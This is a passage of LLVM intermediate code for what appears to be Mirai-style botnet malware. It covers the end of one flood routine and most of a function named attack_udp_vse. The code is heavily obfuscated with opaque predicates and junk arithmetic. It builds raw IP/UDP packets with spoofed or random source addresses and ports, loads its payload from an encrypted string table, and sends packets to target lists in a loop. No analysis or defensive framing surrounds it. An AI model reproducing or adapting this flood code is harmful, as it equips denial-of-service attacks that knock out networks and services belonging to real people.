  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %235

; <label>:456:                                    ; preds = %129, %originalBBpart28
  %457 = load i32, i32* @x.31
  %458 = load i32, i32* @y.32
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %456
  %465 = load i32, i32* @x.31
  %466 = load i32, i32* @y.32
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %71
  store i16 1460, i16* %18, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %473 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %473, i32* %10, align 4
  %474 = icmp eq i32 %473, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %107
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %132
  store i32 0, i32* %9, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %235
  store i32 0, i32* %9, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %257
  %475 = load i8**, i8*** %11, align 8
  %476 = load i32, i32* %9, align 4
  %477 = sext i32 %476 to i64
  %478 = getelementptr inbounds i8*, i8** %475, i64 %477
  %479 = load i8*, i8** %478, align 8
  store i8* %479, i8** %23, align 8
  %480 = load i8*, i8** %23, align 8
  %481 = bitcast i8* %480 to %struct.iphdr*
  store %struct.iphdr* %481, %struct.iphdr** %24, align 8
  %482 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i64 1
  %484 = bitcast %struct.iphdr* %483 to %struct.udphdr*
  store %struct.udphdr* %484, %struct.udphdr** %25, align 8
  %485 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i64 1
  %487 = bitcast %struct.udphdr* %486 to i8*
  store i8* %487, i8** %26, align 8
  %488 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %491, i32 0, i32 2
  %493 = load i8, i8* %492, align 4
  %494 = zext i8 %493 to i32
  %495 = icmp slt i32 %494, 32
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %332
  %496 = load i16, i16* %16, align 2
  %497 = zext i16 %496 to i32
  %498 = icmp eq i32 %497, 65535
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %373
  %499 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 7
  store i16 0, i16* %500, align 2
  %501 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %502 = bitcast %struct.iphdr* %501 to i16*
  %503 = call zeroext i16 @checksum_generic(i16* %502, i32 20)
  %504 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 7
  store i16 %503, i16* %505, align 2
  %506 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %507 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %506, i32 0, i32 3
  store i16 0, i16* %507, align 2
  %508 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %509 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %510 = bitcast %struct.udphdr* %509 to i8*
  %511 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %512 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %511, i32 0, i32 2
  %513 = load i16, i16* %512, align 2
  %514 = load i16, i16* %18, align 2
  %515 = zext i16 %514 to i64
  %_ = sub i64 0, 8
  %gen = add i64 %_, %515
  %_27 = sub i64 0, 8
  %gen28 = add i64 %_27, %515
  %_29 = sub i64 8, %515
  %gen30 = mul i64 %_29, %515
  %_31 = shl i64 8, %515
  %_32 = sub i64 0, 8
  %gen33 = add i64 %_32, %515
  %_34 = shl i64 8, %515
  %_35 = sub i64 0, 8
  %gen36 = add i64 %_35, %515
  %516 = add i64 8, %515
  %517 = trunc i64 %516 to i32
  %518 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %508, i8* %510, i16 zeroext %513, i32 %517)
  %519 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %520 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %519, i32 0, i32 3
  store i16 %518, i16* %520, align 2
  %521 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %522 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %521, i32 0, i32 1
  %523 = load i16, i16* %522, align 2
  %524 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %525 = load i32, i32* %9, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %524, i64 %526
  %528 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i32 0, i32 0
  %529 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %528, i32 0, i32 1
  store i16 %523, i16* %529, align 2
  %530 = load i32, i32* %10, align 4
  %531 = load i8*, i8** %23, align 8
  %532 = load i16, i16* %18, align 2
  %533 = zext i16 %532 to i64
  %_37 = shl i64 28, %533
  %_38 = sub i64 28, %533
  %gen39 = mul i64 %_38, %533
  %_40 = sub i64 28, %533
  %gen41 = mul i64 %_40, %533
  %534 = add i64 28, %533
  %535 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %536 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %537 = load i32, i32* %9, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i64 %538
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %539, i32 0, i32 0
  %541 = bitcast %struct.sockaddr_in* %540 to %struct.sockaddr*
  store %struct.sockaddr* %541, %struct.sockaddr** %535, align 8
  %542 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %543 = load %struct.sockaddr*, %struct.sockaddr** %542, align 8
  %544 = call i64 @sendto(i32 %530, i8* %531, i64 %534, i32 16384, %struct.sockaddr* %543, i32 16)
  br label %originalBB26

originalBB45alteredBB:                            ; preds = %originalBB45, %439
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %456
  br label %originalBB49
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 29)
  %55 = call i8* @table_retrieve_val(i32 29, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %400

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %400

; <label>:67:                                     ; preds = %59
  %68 = load i32, i32* @x.33
  %69 = load i32, i32* @y.34
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %67
  store i32 0, i32* %9, align 4
  %76 = load i32, i32* @x.33
  %77 = load i32, i32* @y.34
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %84

; <label>:84:                                     ; preds = %originalBBpart220, %originalBBpart2
  %85 = load i32, i32* @x.33
  %86 = load i32, i32* @y.34
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %84
  %93 = load i32, i32* %9, align 4
  %94 = load i8, i8* %5, align 1
  %95 = zext i8 %94 to i32
  %96 = icmp slt i32 %93, %95
  %97 = load i32, i32* @x.33
  %98 = load i32, i32* @y.34
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %96, label %105, label %211

; <label>:105:                                    ; preds = %originalBBpart24
  %106 = call noalias i8* @calloc(i64 128, i64 1) #6
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  store i8* %106, i8** %110, align 8
  %111 = load i8**, i8*** %11, align 8
  %112 = load i32, i32* %9, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  store %struct.iphdr* %116, %struct.iphdr** %20, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %118 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %117, i64 1
  %119 = bitcast %struct.iphdr* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %21, align 8
  %120 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %121 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %120, i64 1
  %122 = bitcast %struct.udphdr* %121 to i8*
  store i8* %122, i8** %22, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = load i8, i8* %124, align 4
  %126 = and i8 %125, 15
  %127 = or i8 %126, 64
  store i8 %127, i8* %124, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = and i8 %130, -16
  %132 = or i8 %131, 5
  store i8 %132, i8* %129, align 4
  %133 = load i8, i8* %12, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 1
  store i8 %133, i8* %135, align 1
  %136 = load i32, i32* %19, align 4
  %137 = sext i32 %136 to i64
  %138 = add i64 32, %137
  %139 = trunc i64 %138 to i16
  %140 = call zeroext i16 @htons(i16 zeroext %139) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 2
  store i16 %140, i16* %142, align 2
  %143 = load i16, i16* %13, align 2
  %144 = call zeroext i16 @htons(i16 zeroext %143) #7
  %145 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 3
  store i16 %144, i16* %146, align 4
  %147 = load i8, i8* %14, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 5
  store i8 %147, i8* %149, align 4
  %150 = load i8, i8* %15, align 1
  %151 = icmp ne i8 %150, 0
  br i1 %151, label %152, label %156

; <label>:152:                                    ; preds = %105
  %153 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 4
  store i16 %153, i16* %155, align 2
  br label %156

; <label>:156:                                    ; preds = %152, %105
  %157 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 6
  store i8 17, i8* %158, align 1
  %159 = load i32, i32* @LOCAL_ADDR, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 8
  store i32 %159, i32* %161, align 4
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 9
  store i32 %167, i32* %169, align 4
  %170 = load i16, i16* %16, align 2
  %171 = call zeroext i16 @htons(i16 zeroext %170) #7
  %172 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  store i16 %171, i16* %173, align 2
  %174 = load i16, i16* %17, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 1
  store i16 %175, i16* %177, align 2
  %178 = load i32, i32* %19, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 12, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i8*, i8** %22, align 8
  %186 = bitcast i8* %185 to i32*
  store i32 -1, i32* %186, align 4
  %187 = load i8*, i8** %22, align 8
  %188 = getelementptr inbounds i8, i8* %187, i64 4
  store i8* %188, i8** %22, align 8
  %189 = load i8*, i8** %22, align 8
  %190 = load i8*, i8** %18, align 8
  %191 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %189, i8* %190, i32 %191)
  br label %192

; <label>:192:                                    ; preds = %156
  %193 = load i32, i32* @x.33
  %194 = load i32, i32* @y.34
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %192
  %201 = load i32, i32* %9, align 4
  %202 = add nsw i32 %201, 1
  store i32 %202, i32* %9, align 4
  %203 = load i32, i32* @x.33
  %204 = load i32, i32* @y.34
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart220, label %originalBB6alteredBB

originalBBpart220:                                ; preds = %originalBB6
  br label %84

; <label>:211:                                    ; preds = %originalBBpart24
  br label %212

; <label>:212:                                    ; preds = %399, %211
  %213 = load i32, i32* @x.33
  %214 = load i32, i32* @y.34
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %212
  store i32 0, i32* %9, align 4
  %221 = load i32, i32* @x.33
  %222 = load i32, i32* @y.34
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %229

; <label>:229:                                    ; preds = %originalBBpart242, %originalBBpart224
  %230 = load i32, i32* @x.33
  %231 = load i32, i32* @y.34
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %229
  %238 = load i32, i32* %9, align 4
  %239 = load i8, i8* %5, align 1
  %240 = zext i8 %239 to i32
  %241 = icmp slt i32 %238, %240
  %242 = load i32, i32* @x.33
  %243 = load i32, i32* @y.34
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %241, label %250, label %399

; <label>:250:                                    ; preds = %originalBBpart228
  %251 = load i32, i32* @x.33
  %252 = load i32, i32* @y.34
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %250
  %259 = load i8**, i8*** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds i8*, i8** %259, i64 %261
  %263 = load i8*, i8** %262, align 8
  store i8* %263, i8** %23, align 8
  %264 = load i8*, i8** %23, align 8
  %265 = bitcast i8* %264 to %struct.iphdr*
  store %struct.iphdr* %265, %struct.iphdr** %24, align 8
  %266 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i64 1
  %268 = bitcast %struct.iphdr* %267 to %struct.udphdr*
  store %struct.udphdr* %268, %struct.udphdr** %25, align 8
  %269 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %270 = load i32, i32* %9, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %269, i64 %271
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i32 0, i32 2
  %274 = load i8, i8* %273, align 4
  %275 = zext i8 %274 to i32
  %276 = icmp slt i32 %275, 32
  %277 = load i32, i32* @x.33
  %278 = load i32, i32* @y.34
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %276, label %285, label %306

; <label>:285:                                    ; preds = %originalBBpart232
  %286 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %287 = load i32, i32* %9, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i64 %288
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i32 0, i32 1
  %291 = load i32, i32* %290, align 4
  %292 = call i32 @ntohl(i32 %291) #7
  %293 = call i32 @rand_next()
  %294 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i32 0, i32 2
  %299 = load i8, i8* %298, align 4
  %300 = zext i8 %299 to i32
  %301 = lshr i32 %293, %300
  %302 = add i32 %292, %301
  %303 = call i32 @htonl(i32 %302) #7
  %304 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 9
  store i32 %303, i32* %305, align 4
  br label %306

; <label>:306:                                    ; preds = %285, %originalBBpart232
  %307 = load i16, i16* %13, align 2
  %308 = zext i16 %307 to i32
  %309 = icmp eq i32 %308, 65535
  br i1 %309, label %310, label %315

; <label>:310:                                    ; preds = %306
  %311 = call i32 @rand_next()
  %312 = trunc i32 %311 to i16
  %313 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 3
  store i16 %312, i16* %314, align 4
  br label %315

; <label>:315:                                    ; preds = %310, %306
  %316 = load i16, i16* %16, align 2
  %317 = zext i16 %316 to i32
  %318 = icmp eq i32 %317, 65535
  br i1 %318, label %319, label %324

; <label>:319:                                    ; preds = %315
  %320 = call i32 @rand_next()
  %321 = trunc i32 %320 to i16
  %322 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 0
  store i16 %321, i16* %323, align 2
  br label %324

; <label>:324:                                    ; preds = %319, %315
  %325 = load i16, i16* %17, align 2
  %326 = zext i16 %325 to i32
  %327 = icmp eq i32 %326, 65535
  br i1 %327, label %328, label %333

; <label>:328:                                    ; preds = %324
  %329 = call i32 @rand_next()
  %330 = trunc i32 %329 to i16
  %331 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %332 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %331, i32 0, i32 1
  store i16 %330, i16* %332, align 2
  br label %333

; <label>:333:                                    ; preds = %328, %324
  %334 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 7
  store i16 0, i16* %335, align 2
  %336 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %337 = bitcast %struct.iphdr* %336 to i16*
  %338 = call zeroext i16 @checksum_generic(i16* %337, i32 20)
  %339 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 7
  store i16 %338, i16* %340, align 2
  %341 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i32 0, i32 3
  store i16 0, i16* %342, align 2
  %343 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %344 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %345 = bitcast %struct.udphdr* %344 to i8*
  %346 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %347 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %346, i32 0, i32 2
  %348 = load i16, i16* %347, align 2
  %349 = load i32, i32* %19, align 4
  %350 = sext i32 %349 to i64
  %351 = add i64 12, %350
  %352 = trunc i64 %351 to i32
  %353 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %343, i8* %345, i16 zeroext %348, i32 %352)
  %354 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %355 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 2
  %356 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i32 0, i32 1
  %358 = load i16, i16* %357, align 2
  %359 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %360 = load i32, i32* %9, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i32 0, i32 0
  %364 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %363, i32 0, i32 1
  store i16 %358, i16* %364, align 2
  %365 = load i32, i32* %10, align 4
  %366 = load i8*, i8** %23, align 8
  %367 = load i32, i32* %19, align 4
  %368 = sext i32 %367 to i64
  %369 = add i64 32, %368
  %370 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 0
  %376 = bitcast %struct.sockaddr_in* %375 to %struct.sockaddr*
  store %struct.sockaddr* %376, %struct.sockaddr** %370, align 8
  %377 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %378 = load %struct.sockaddr*, %struct.sockaddr** %377, align 8
  %379 = call i64 @sendto(i32 %365, i8* %366, i64 %369, i32 16384, %struct.sockaddr* %378, i32 16)
  br label %380

; <label>:380:                                    ; preds = %333
  %381 = load i32, i32* @x.33
  %382 = load i32, i32* @y.34
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %380
  %389 = load i32, i32* %9, align 4
  %390 = add nsw i32 %389, 1
  store i32 %390, i32* %9, align 4
  %391 = load i32, i32* @x.33
  %392 = load i32, i32* @y.34
  %393 = sub i32 %391, 1
